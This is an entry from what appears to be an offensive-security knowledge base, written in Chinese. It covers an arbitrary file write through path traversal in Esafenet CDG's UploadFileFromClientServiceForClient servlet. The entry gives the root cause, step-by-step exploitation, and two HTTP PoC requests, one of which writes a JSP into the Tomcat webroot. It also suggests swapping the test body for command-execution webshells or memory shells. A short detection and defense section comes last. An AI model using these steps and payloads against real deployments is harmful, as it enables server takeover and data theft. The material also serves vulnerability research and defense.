---
id: web-generic-file-upload-esafenet-uploadfilefromclient-filename-traversal
title: 亿赛通 UploadFileFromClientServiceForClient：query 参数 a 经 CDGUtil.decode 还原 fileName，未过滤后缀与 ../ 直接写 JSP
type: scenario
domain: web
path: web/generic/file-upload
technique: esafenet-uploadfilefromclient-filename-traversal-webshell
aliases:
- 亿赛通 UploadFileFromClientServiceForClient
- 亿赛通 任意文件上传
- CDGUtil.decode fileName
- fileName 路径穿越 上传
- C:\fileDB\uploaded\store
- CDGServer3 上传 JSP
tags:
- java
- esafenet
- cdg
- file-upload
- path-traversal
- arbitrary-file-write
- webshell
- query-string
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V668
  verified_at: '2026-11-13T09:57:52+08:00'
  notes: 已对照原文与14张截图核对：web.xml 映射、getQueryString→substring→CDGUtil.decode→split(&)→fileName、File(UPLOAD_PATH+fileName) 写入、默认落 C:\fileDB\uploaded\store、穿越 webapps/ROOT/1.jsp 后 GET 返回 123213 均与截图一致；已修正 PoC Content-Length 为截图实际值 26。未验证点：原文未讨论该 servlet 鉴权，仅在本地安装环境复现，未在原文之外复跑。
---

## 一句话结论

亿赛通 CDG 的 `/CDGServer3/UploadFileFromClientServiceForClient` servlet 把 query string 第一个 `=` 之后的内容交给 `CDGUtil.decode`，再按 `&` 切分并以 `fileName=` 前缀取值作为写入文件名；文件名没有后缀白名单与 `../` 过滤，直接拼到 `Constant.instance.UPLOAD_PATH`（默认 `C:\fileDB\uploaded\store`）后写请求体，攻击者构造 `fileName=1.jsp` 即可在默认目录落 JSP（需结合别的方式访问），再用 `fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/1.jsp` 穿越到 Web 根目录，访问即执行。

## 原理

- **入口**：`web.xml` 将 `/UploadFileFromClientServiceForClient` 映射到 `com.esafenet.servlet.fileManagement.UploadFileFromClientServiceForClient`（同文件紧邻的还有 `SaveCDGPermissionFromGFOA` 等 servlet）。
- **参数解析**：`value_code = req.getQueryString()`；`value_code = value_code.substring(value_code.indexOf("=")+1)`（只取第一个 `=` 后的全部内容）；`value_decode = CDGUtil.decode(value_code)`；`vds = value_decode.split("&")`。随后遍历 `vds`，对以 `fileName` 开头的元素取 `substring(indexOf("=")+1)` 作为 `fileName`，同样解析出 fileId/secFileId/reqTitle/appReqReport/appPerson。
- **写入**：`File file = new File(Constant.instance.UPLOAD_PATH + fileName); file.getParentFile().mkdirs(); file.createNewFile(); OutputStream os = new FileOutputStream(file);` 然后把 request body 按 1024 字节循环写入。文件名没有做后缀检查，路径没有做规范化/前缀校验，`fileName` 中的 `../` 原样进入 `File` 路径。
- **默认路径**：不带穿越时文件落在 `C:\fileDB\uploaded\store\1.jsp`；由于安装包默认安装路径固定，`../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/1.jsp` 可从上传目录穿越回 Tomcat 的 Web 根，写出可直接访问的 JSP。
- **为什么有效**：安全边界只依赖“客户端按约定传参”，服务端信任解码后的 `fileName`；`CDGUtil.decode` 只是产品自实现的编码（不是签名），攻击者可自行生成；写入后 Tomcat 将 `.jsp` 当动态资源解析，形成 WebShell。
- **边界**：上传目录常量随部署变化；原文请求携带 `JSESSIONID`，未讨论该 servlet 是否要求登录，实战需按目标 web.xml/过滤链确认；若 Web 根不在默认盘符/路径，需调整穿越层数与目标目录。

## 触发条件

- 目标为亿赛通 CDG（CDocGuard Server，默认部署含 Tomcat64、`CDGServer3` context）。
- `/CDGServer3/UploadFileFromClientServiceForClient` 可达（是否需会话按部署验证；原文请求带 JSESSIONID）。
- 服务端进程对上传目录与目标 Web 目录有写权限（默认安装下同盘可写）。
- 能自行调用 `CDGUtil.decode`（使用产品 jar）生成参数值。

## 利用步骤

1. 解包/审计安装目录，在 `web.xml` 搜索 upload 相关 servlet，定位 `UploadFileFromClientServiceForClient` 映射与实现类。
2. 构造明文 `fileName=1.jsp&1`，用产品 jar 的 `CDGUtil.encode` 编码，作为 query 参数 `a` 发送 POST，确认文件出现在 `C:\fileDB\uploaded\store`（原文截图验证）。
3. 构造穿越明文 `fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/1.jsp&1`，同样编码后作为 `a` 发送，body 为 JSP 内容（如 `<%out.println("123213");%>`）。
4. 服务端返回 200 且 Set-Cookie 新 JSESSIONID；访问 `http://target:8443/1.jsp`，页面输出执行结果，确认 WebShell 写入成功。
5. 将 body 替换为命令执行/内存马等实际 payload，按需清理上传目录残留。

## PoC

```http
POST /CDGServer3/UploadFileFromClientServiceForClient?a=<CDGUtil.encode("fileName=1.jsp&1")> HTTP/1.1
Host: 192.168.37.130:8443
Connection: close
Content-Length: 26

<%out.println("123213");%>
```

```http
POST /CDGServer3/UploadFileFromClientServiceForClient?a=<CDGUtil.encode("fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/1.jsp&1")> HTTP/1.1
Host: 192.168.37.130:8443
Connection: close
Content-Length: 26

<%out.println("123213");%>
```

说明：`<CDGUtil.encode(...)>` 需用目标产品 jar 生成（原文给出的示例密文之一为短串 `ODJNOLIDLOLPEJHCOIFJJDIJOLLFJLDE`，对应 `fileName=1.jsp&1`）；IP/路径为原文演示环境，实战按安装路径调整。未在原文之外复跑。

## 变体与关联

- [[web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell]]：同产品另一上传接口 `/file/uploadSoftWareFile`，`patch` 参数穿越，入口与参数完全不同。
- [[web-generic-file-upload-esafenet-hiddenwatermark-zipslip-webshell]]：同产品 `hiddenWatermark/uploadFile` 的 Zip Slip 写入，机制不同。
- [[web-java-component-esafenet-cdg-importpolicy-deserialization-rce]]：同产品反序列化 RCE，可作上传受限时的替代链。
- 变体：`fileName` 可指向其他 Web 可访问目录（`CDGServer3/static` 等）；写入内容可换成冰蝎/哥斯拉 JSP 或内存马 loader；参数 `a` 的编码可换用其他调用 CDGUtil 的产品接口生成。
- 边界：若目标修改默认安装路径或 Web 根与上传目录不同盘，穿越路径需重算；若 servlet 实际要求登录，则需先获得会话（默认口令/鉴权绕过等）。

## 检测与防御

- 检测：访问日志中 `/UploadFileFromClientServiceForClient` 的 `a` 参数解码后出现 `fileName=` 且含 `../`、盘符、`webapps`、`.jsp`；响应 200 且随后出现对新 JSP 的 GET。
- 检测：上传目录 `C:\fileDB\uploaded\store` 与 Tomcat `webapps` 下出现非预期 JSP；文件创建进程为 Tomcat/Java。
- 防御：该 servlet 增加会话鉴权；`fileName` 只取 basename、后缀白名单；写入前 `getCanonicalPath()` 校验必须位于上传目录；上传目录与 Web 目录分盘/只读；升级厂商修复版本。
- 响应：删除穿越写入的 JSP、排查同批上传与后续访问、轮换会话。
